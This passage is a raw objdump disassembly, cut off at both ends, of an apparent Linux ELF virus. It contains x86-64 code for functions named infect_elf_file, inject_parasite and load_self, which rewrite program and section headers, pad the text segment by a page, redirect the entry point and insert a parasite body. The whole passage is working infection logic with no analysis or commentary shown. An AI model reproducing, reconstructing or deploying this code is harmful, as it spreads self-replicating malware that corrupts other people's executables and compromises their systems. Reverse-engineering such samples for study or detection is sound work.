  40088d:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  400891:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400898:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  40089c:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  4008a0:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4008a4:	48 25 00 f0 ff ff    	and    rax,0xfffffffffffff000
  4008aa:	48 05 00 10 00 00    	add    rax,0x1000
  4008b0:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4008b4:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008bb:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  4008bf:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4008c3:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4008c7:	48 83 c0 09          	add    rax,0x9
  4008cb:	c7 00 25 5d 01 00    	mov    DWORD PTR [rax],0x15d25
  4008d1:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008d8:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4008db:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  4008df:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008e6:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4008ea:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  4008ee:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008f5:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  4008f9:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  4008fd:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400901:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  400905:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  400909:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40090d:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  400911:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400915:	48 01 c2             	add    rdx,rax
  400918:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40091c:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400920:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400924:	48 83 c0 38          	add    rax,0x38
  400928:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40092c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400930:	48 83 c0 38          	add    rax,0x38
  400934:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400938:	48 01 ca             	add    rdx,rcx
  40093b:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40093f:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400946:	e9 37 03 00 00       	jmp    400c82 <infect_elf_file+0x424>
  40094b:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  40094f:	74 4b                	je     40099c <infect_elf_file+0x13e>
  400951:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400954:	48 63 d0             	movsxd rdx,eax
  400957:	48 89 d0             	mov    rax,rdx
  40095a:	48 c1 e0 03          	shl    rax,0x3
  40095e:	48 29 d0             	sub    rax,rdx
  400961:	48 c1 e0 03          	shl    rax,0x3
  400965:	48 89 c2             	mov    rdx,rax
  400968:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40096c:	48 01 d0             	add    rax,rdx
  40096f:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400973:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400976:	48 63 d0             	movsxd rdx,eax
  400979:	48 89 d0             	mov    rax,rdx
  40097c:	48 c1 e0 03          	shl    rax,0x3
  400980:	48 29 d0             	sub    rax,rdx
  400983:	48 c1 e0 03          	shl    rax,0x3
  400987:	48 89 c2             	mov    rdx,rax
  40098a:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40098e:	48 01 d0             	add    rax,rdx
  400991:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400995:	48 01 ca             	add    rdx,rcx
  400998:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40099c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40099f:	48 63 d0             	movsxd rdx,eax
  4009a2:	48 89 d0             	mov    rax,rdx
  4009a5:	48 c1 e0 03          	shl    rax,0x3
  4009a9:	48 29 d0             	sub    rax,rdx
  4009ac:	48 c1 e0 03          	shl    rax,0x3
  4009b0:	48 89 c2             	mov    rdx,rax
  4009b3:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009b7:	48 01 d0             	add    rax,rdx
  4009ba:	8b 00                	mov    eax,DWORD PTR [rax]
  4009bc:	83 f8 01             	cmp    eax,0x1
  4009bf:	0f 85 1f 02 00 00    	jne    400be4 <infect_elf_file+0x386>
  4009c5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009c8:	48 63 d0             	movsxd rdx,eax
  4009cb:	48 89 d0             	mov    rax,rdx
  4009ce:	48 c1 e0 03          	shl    rax,0x3
  4009d2:	48 29 d0             	sub    rax,rdx
  4009d5:	48 c1 e0 03          	shl    rax,0x3
  4009d9:	48 89 c2             	mov    rdx,rax
  4009dc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009e0:	48 01 d0             	add    rax,rdx
  4009e3:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  4009e6:	83 f8 05             	cmp    eax,0x5
  4009e9:	0f 85 f5 01 00 00    	jne    400be4 <infect_elf_file+0x386>
  4009ef:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009f2:	48 63 d0             	movsxd rdx,eax
  4009f5:	48 89 d0             	mov    rax,rdx
  4009f8:	48 c1 e0 03          	shl    rax,0x3
  4009fc:	48 29 d0             	sub    rax,rdx
  4009ff:	48 c1 e0 03          	shl    rax,0x3
  400a03:	48 89 c2             	mov    rdx,rax
  400a06:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a0a:	48 01 d0             	add    rax,rdx
  400a0d:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400a11:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400a15:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a18:	48 63 d0             	movsxd rdx,eax
  400a1b:	48 89 d0             	mov    rax,rdx
  400a1e:	48 c1 e0 03          	shl    rax,0x3
  400a22:	48 29 d0             	sub    rax,rdx
  400a25:	48 c1 e0 03          	shl    rax,0x3
  400a29:	48 89 c2             	mov    rdx,rax
  400a2c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a30:	48 01 d0             	add    rax,rdx
  400a33:	48 8b 48 10          	mov    rcx,QWORD PTR [rax+0x10]
  400a37:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a3a:	48 63 d0             	movsxd rdx,eax
  400a3d:	48 89 d0             	mov    rax,rdx
  400a40:	48 c1 e0 03          	shl    rax,0x3
  400a44:	48 29 d0             	sub    rax,rdx
  400a47:	48 c1 e0 03          	shl    rax,0x3
  400a4b:	48 89 c2             	mov    rdx,rax
  400a4e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a52:	48 01 c2             	add    rdx,rax
  400a55:	48 89 c8             	mov    rax,rcx
  400a58:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400a5c:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400a60:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a63:	48 63 d0             	movsxd rdx,eax
  400a66:	48 89 d0             	mov    rax,rdx
  400a69:	48 c1 e0 03          	shl    rax,0x3
  400a6d:	48 29 d0             	sub    rax,rdx
  400a70:	48 c1 e0 03          	shl    rax,0x3
  400a74:	48 89 c2             	mov    rdx,rax
  400a77:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a7b:	48 01 d0             	add    rax,rdx
  400a7e:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400a82:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a85:	48 63 d0             	movsxd rdx,eax
  400a88:	48 89 d0             	mov    rax,rdx
  400a8b:	48 c1 e0 03          	shl    rax,0x3
  400a8f:	48 29 d0             	sub    rax,rdx
  400a92:	48 c1 e0 03          	shl    rax,0x3
  400a96:	48 89 c2             	mov    rdx,rax
  400a99:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a9d:	48 01 c2             	add    rdx,rax
  400aa0:	48 89 c8             	mov    rax,rcx
  400aa3:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400aa7:	48 89 42 18          	mov    QWORD PTR [rdx+0x18],rax
  400aab:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400aae:	48 63 d0             	movsxd rdx,eax
  400ab1:	48 89 d0             	mov    rax,rdx
  400ab4:	48 c1 e0 03          	shl    rax,0x3
  400ab8:	48 29 d0             	sub    rax,rdx
  400abb:	48 c1 e0 03          	shl    rax,0x3
  400abf:	48 89 c2             	mov    rdx,rax
  400ac2:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ac6:	48 01 d0             	add    rax,rdx
  400ac9:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400acd:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ad0:	48 63 d0             	movsxd rdx,eax
  400ad3:	48 89 d0             	mov    rax,rdx
  400ad6:	48 c1 e0 03          	shl    rax,0x3
  400ada:	48 29 d0             	sub    rax,rdx
  400add:	48 c1 e0 03          	shl    rax,0x3
  400ae1:	48 89 c2             	mov    rdx,rax
  400ae4:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ae8:	48 01 d0             	add    rax,rdx
  400aeb:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400aef:	48 01 ca             	add    rdx,rcx
  400af2:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400af6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400af9:	48 63 d0             	movsxd rdx,eax
  400afc:	48 89 d0             	mov    rax,rdx
  400aff:	48 c1 e0 03          	shl    rax,0x3
  400b03:	48 29 d0             	sub    rax,rdx
  400b06:	48 c1 e0 03          	shl    rax,0x3
  400b0a:	48 89 c2             	mov    rdx,rax
  400b0d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b11:	48 01 d0             	add    rax,rdx
  400b14:	48 8b 48 28          	mov    rcx,QWORD PTR [rax+0x28]
  400b18:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b1b:	48 63 d0             	movsxd rdx,eax
  400b1e:	48 89 d0             	mov    rax,rdx
  400b21:	48 c1 e0 03          	shl    rax,0x3
  400b25:	48 29 d0             	sub    rax,rdx
  400b28:	48 c1 e0 03          	shl    rax,0x3
  400b2c:	48 89 c2             	mov    rdx,rax
  400b2f:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b33:	48 01 d0             	add    rax,rdx
  400b36:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400b3a:	48 01 ca             	add    rdx,rcx
  400b3d:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400b41:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b44:	48 63 d0             	movsxd rdx,eax
  400b47:	48 89 d0             	mov    rax,rdx
  400b4a:	48 c1 e0 03          	shl    rax,0x3
  400b4e:	48 29 d0             	sub    rax,rdx
  400b51:	48 c1 e0 03          	shl    rax,0x3
  400b55:	48 89 c2             	mov    rdx,rax
  400b58:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b5c:	48 01 d0             	add    rax,rdx
  400b5f:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400b66:	00 
  400b67:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b6a:	48 63 d0             	movsxd rdx,eax
  400b6d:	48 89 d0             	mov    rax,rdx
  400b70:	48 c1 e0 03          	shl    rax,0x3
  400b74:	48 29 d0             	sub    rax,rdx
  400b77:	48 c1 e0 03          	shl    rax,0x3
  400b7b:	48 89 c2             	mov    rdx,rax
  400b7e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b82:	48 01 d0             	add    rax,rdx
  400b85:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400b89:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400b8d:	c7 45 fc 01 00 00 00 	mov    DWORD PTR [rbp-0x4],0x1
  400b94:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b97:	48 63 d0             	movsxd rdx,eax
  400b9a:	48 89 d0             	mov    rax,rdx
  400b9d:	48 c1 e0 03          	shl    rax,0x3
  400ba1:	48 29 d0             	sub    rax,rdx
  400ba4:	48 c1 e0 03          	shl    rax,0x3
  400ba8:	48 89 c2             	mov    rdx,rax
  400bab:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400baf:	48 01 d0             	add    rax,rdx
  400bb2:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400bb6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400bb9:	48 63 d0             	movsxd rdx,eax
  400bbc:	48 89 d0             	mov    rax,rdx
  400bbf:	48 c1 e0 03          	shl    rax,0x3
  400bc3:	48 29 d0             	sub    rax,rdx
  400bc6:	48 c1 e0 03          	shl    rax,0x3
  400bca:	48 89 c2             	mov    rdx,rax
  400bcd:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bd1:	48 01 d0             	add    rax,rdx
  400bd4:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400bd8:	48 01 ca             	add    rdx,rcx
  400bdb:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400bdf:	e9 9a 00 00 00       	jmp    400c7e <infect_elf_file+0x420>
  400be4:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400be7:	48 63 d0             	movsxd rdx,eax
  400bea:	48 89 d0             	mov    rax,rdx
  400bed:	48 c1 e0 03          	shl    rax,0x3
  400bf1:	48 29 d0             	sub    rax,rdx
  400bf4:	48 c1 e0 03          	shl    rax,0x3
  400bf8:	48 89 c2             	mov    rdx,rax
  400bfb:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bff:	48 01 d0             	add    rax,rdx
  400c02:	8b 00                	mov    eax,DWORD PTR [rax]
  400c04:	83 f8 01             	cmp    eax,0x1
  400c07:	75 75                	jne    400c7e <infect_elf_file+0x420>
  400c09:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c0c:	48 63 d0             	movsxd rdx,eax
  400c0f:	48 89 d0             	mov    rax,rdx
  400c12:	48 c1 e0 03          	shl    rax,0x3
  400c16:	48 29 d0             	sub    rax,rdx
  400c19:	48 c1 e0 03          	shl    rax,0x3
  400c1d:	48 89 c2             	mov    rdx,rax
  400c20:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c24:	48 01 d0             	add    rax,rdx
  400c27:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  400c2b:	48 85 c0             	test   rax,rax
  400c2e:	74 4e                	je     400c7e <infect_elf_file+0x420>
  400c30:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c33:	48 63 d0             	movsxd rdx,eax
  400c36:	48 89 d0             	mov    rax,rdx
  400c39:	48 c1 e0 03          	shl    rax,0x3
  400c3d:	48 29 d0             	sub    rax,rdx
  400c40:	48 c1 e0 03          	shl    rax,0x3
  400c44:	48 89 c2             	mov    rdx,rax
  400c47:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c4b:	48 01 d0             	add    rax,rdx
  400c4e:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400c51:	83 e0 02             	and    eax,0x2
  400c54:	85 c0                	test   eax,eax
  400c56:	74 26                	je     400c7e <infect_elf_file+0x420>
  400c58:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c5b:	48 63 d0             	movsxd rdx,eax
  400c5e:	48 89 d0             	mov    rax,rdx
  400c61:	48 c1 e0 03          	shl    rax,0x3
  400c65:	48 29 d0             	sub    rax,rdx
  400c68:	48 c1 e0 03          	shl    rax,0x3
  400c6c:	48 89 c2             	mov    rdx,rax
  400c6f:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c73:	48 01 d0             	add    rax,rdx
  400c76:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400c7d:	00 
  400c7e:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400c82:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c86:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  400c8a:	0f b7 c0             	movzx  eax,ax
  400c8d:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400c90:	0f 8c b5 fc ff ff    	jl     40094b <infect_elf_file+0xed>
  400c96:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  400c9a:	75 0c                	jne    400ca8 <infect_elf_file+0x44a>
  400c9c:	48 c7 c0 ff ff ff ff 	mov    rax,0xffffffffffffffff
  400ca3:	e9 e3 01 00 00       	jmp    400e8b <infect_elf_file+0x62d>
  400ca8:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400cac:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400cb0:	48 8d 50 40          	lea    rdx,[rax+0x40]
  400cb4:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400cb8:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400cbc:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400cc0:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400cc4:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400cc8:	48 01 d0             	add    rax,rdx
  400ccb:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  400ccf:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400cd3:	0f b7 40 3e          	movzx  eax,WORD PTR [rax+0x3e]
  400cd7:	0f b7 c0             	movzx  eax,ax
  400cda:	48 c1 e0 06          	shl    rax,0x6
  400cde:	48 89 c2             	mov    rdx,rax
  400ce1:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ce5:	48 01 d0             	add    rax,rdx
  400ce8:	48 8b 50 18          	mov    rdx,QWORD PTR [rax+0x18]
  400cec:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400cf0:	48 01 d0             	add    rax,rdx
  400cf3:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  400cf7:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400cfe:	e9 1d 01 00 00       	jmp    400e20 <infect_elf_file+0x5c2>
  400d03:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d06:	48 98                	cdqe   
  400d08:	48 c1 e0 06          	shl    rax,0x6
  400d0c:	48 89 c2             	mov    rdx,rax
  400d0f:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d13:	48 01 d0             	add    rax,rdx
  400d16:	8b 00                	mov    eax,DWORD PTR [rax]
  400d18:	89 c2                	mov    edx,eax
  400d1a:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  400d1e:	48 01 d0             	add    rax,rdx
  400d21:	ba 05 00 00 00       	mov    edx,0x5
  400d26:	48 8d 35 f5 20 00 00 	lea    rsi,[rip+0x20f5]        # 402e22 <display_skeksi+0xa4>
  400d2d:	48 89 c7             	mov    rdi,rax
  400d30:	e8 dd 1e 00 00       	call   402c12 <_strncmp>
  400d35:	85 c0                	test   eax,eax
  400d37:	0f 85 aa 00 00 00    	jne    400de7 <infect_elf_file+0x589>
  400d3d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d40:	48 98                	cdqe   
  400d42:	48 c1 e0 06          	shl    rax,0x6
  400d46:	48 89 c2             	mov    rdx,rax
  400d49:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d4d:	48 01 d0             	add    rax,rdx
  400d50:	48 c7 40 18 40 00 00 	mov    QWORD PTR [rax+0x18],0x40
  400d57:	00 
  400d58:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d5b:	48 98                	cdqe   
  400d5d:	48 c1 e0 06          	shl    rax,0x6
  400d61:	48 89 c2             	mov    rdx,rax
  400d64:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d68:	48 01 c2             	add    rdx,rax
  400d6b:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400d6f:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400d73:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400d77:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d7a:	48 98                	cdqe   
  400d7c:	48 c1 e0 06          	shl    rax,0x6
  400d80:	48 89 c2             	mov    rdx,rax
  400d83:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d87:	48 01 d0             	add    rax,rdx
  400d8a:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  400d8e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d91:	48 98                	cdqe   
  400d93:	48 c1 e0 06          	shl    rax,0x6
  400d97:	48 89 c1             	mov    rcx,rax
  400d9a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d9e:	48 01 c8             	add    rax,rcx
  400da1:	48 83 c2 40          	add    rdx,0x40
  400da5:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  400da9:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dac:	48 98                	cdqe   
  400dae:	48 c1 e0 06          	shl    rax,0x6
  400db2:	48 89 c2             	mov    rdx,rax
  400db5:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400db9:	48 01 d0             	add    rax,rdx
  400dbc:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400dc0:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400dc7:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400dcb:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dce:	48 98                	cdqe   
  400dd0:	48 c1 e0 06          	shl    rax,0x6
  400dd4:	48 89 c6             	mov    rsi,rax
  400dd7:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400ddb:	48 01 f0             	add    rax,rsi
  400dde:	48 01 ca             	add    rdx,rcx
  400de1:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400de5:	eb 35                	jmp    400e1c <infect_elf_file+0x5be>
  400de7:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400dea:	48 98                	cdqe   
  400dec:	48 c1 e0 06          	shl    rax,0x6
  400df0:	48 89 c2             	mov    rdx,rax
  400df3:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400df7:	48 01 d0             	add    rax,rdx
  400dfa:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400dfe:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400e01:	48 98                	cdqe   
  400e03:	48 c1 e0 06          	shl    rax,0x6
  400e07:	48 89 c2             	mov    rdx,rax
  400e0a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400e0e:	48 01 d0             	add    rax,rdx
  400e11:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400e15:	48 01 ca             	add    rdx,rcx
  400e18:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400e1c:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400e20:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e24:	0f b7 40 3c          	movzx  eax,WORD PTR [rax+0x3c]
  400e28:	0f b7 c0             	movzx  eax,ax
  400e2b:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400e2e:	0f 8c cf fe ff ff    	jl     400d03 <infect_elf_file+0x4a5>
  400e34:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e38:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400e3c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400e40:	48 01 c2             	add    rdx,rax
  400e43:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e47:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400e4b:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e4f:	48 8b 50 20          	mov    rdx,QWORD PTR [rax+0x20]
  400e53:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400e57:	48 01 c2             	add    rdx,rax
  400e5a:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e5e:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400e62:	48 8b 7d a8          	mov    rdi,QWORD PTR [rbp-0x58]
  400e66:	48 8b 8d 08 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xf8]
  400e6d:	48 8b 95 00 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x100]
  400e74:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  400e78:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400e7c:	49 89 f8             	mov    r8,rdi
  400e7f:	48 89 c7             	mov    rdi,rax
  400e82:	e8 39 f7 ff ff       	call   4005c0 <inject_parasite>
  400e87:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400e8b:	c9                   	leave  
  400e8c:	c3                   	ret    

0000000000400e8d <load_self>:
  400e8d:	f3 0f 1e fa          	endbr64 
  400e91:	55                   	push   rbp
  400e92:	48 89 e5             	mov    rbp,rsp
  400e95:	48 83 ec 30          	sub    rsp,0x30
  400e99:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400e9d:	e8 a0 1e 00 00       	call   402d42 <get_rip>
  400ea2:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  400ea9:	48 89 d1             	mov    rcx,rdx
  400eac:	48 c7 c2 5d 2d 40 00 	mov    rdx,0x402d5d
  400eb3:	48 29 d1             	sub    rcx,rdx
  400eb6:	48 89 ca             	mov    rdx,rcx
  400eb9:	48 29 d0             	sub    rax,rdx
  400ebc:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400ec0:	e8 7d 1e 00 00       	call   402d42 <get_rip>
  400ec5:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  400ecc:	48 89 d1             	mov    rcx,rdx
  400ecf:	48 c7 c2 72 2d 40 00 	mov    rdx,0x402d72
  400ed6:	48 29 d1             	sub    rcx,rdx
  400ed9:	48 89 ca             	mov    rdx,rcx
  400edc:	48 29 d0             	sub    rax,rdx
  400edf:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400ee3:	e8 5a 1e 00 00       	call   402d42 <get_rip>
  400ee8:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  400eef:	48 89 d1             	mov    rcx,rdx
  400ef2:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  400ef9:	48 29 d1             	sub    rcx,rdx
  400efc:	48 89 ca             	mov    rdx,rcx
  400eff:	48 29 d0             	sub    rax,rdx
  400f02:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400f06:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400f0a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f0e:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  400f12:	48 c7 c0 5d 2d 40 00 	mov    rax,0x402d5d
  400f19:	48 89 c2             	mov    rdx,rax
  400f1c:	48 c7 c0 9c 01 40 00 	mov    rax,0x40019c
  400f23:	48 29 c2             	sub    rdx,rax
  400f26:	48 89 d0             	mov    rax,rdx
  400f29:	48 89 c2             	mov    rdx,rax
  400f2c:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f30:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f34:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f38:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400f3c:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400f40:	48 2b 45 f8          	sub    rax,QWORD PTR [rbp-0x8]
  400f44:	48 98                	cdqe   
  400f46:	48 01 c2             	add    rdx,rax
